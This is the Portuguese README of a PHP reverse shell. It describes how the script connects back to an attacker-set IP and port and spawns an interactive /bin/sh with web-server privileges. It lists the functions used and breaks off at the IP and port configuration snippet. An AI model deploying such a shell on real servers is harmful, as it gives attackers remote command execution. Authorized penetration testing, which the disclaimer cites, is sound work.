# 🐚 PHP Reverse Shell - Versão em Português

## ⚠️ AVISO LEGAL

> Este código é disponibilizado **somente para fins educacionais** ou para **testes de segurança autorizados**.  
> O uso sem permissão pode violar leis locais ou internacionais.  
> O autor **não se responsabiliza** por qualquer uso indevido deste código.  
> Use **apenas em ambientes controlados** com autorização explícita.

---

## 📖 Descrição

Este script PHP faz uma **conexão TCP reversa** para um IP e porta especificados.  
Assim que a conexão for estabelecida, o atacante recebe um **shell interativo** com os mesmos privilégios do processo PHP (geralmente `www-data`, `apache`, etc).

---

## ✅ Funcionalidades

- Conexão reversa via `fsockopen`
- Execução de shell interativo com `/bin/sh -i`
- Comunicação bidirecional com `proc_open` e `stream_select`
- Tentativa de daemonização para evitar processos zumbis
- Comentários em português explicando todo o funcionamento

---

## 🧪 Requisitos

- PHP 4.3 ou superior
- Funções ativadas: `fsockopen`, `proc_open`, `stream_set_blocking`, `stream_select`
- Ambiente Unix/Linux para melhor compatibilidade

---

## 🛠️ Como Usar

### 1. Edite o script PHP

Abra o arquivo e altere o IP e a porta para o seu host atacante:

```php
$ip = 'SEU_IP_AQUI';   // Exemplo: '192.168.0.100'
$port = 1234;          // Exemplo: 4444
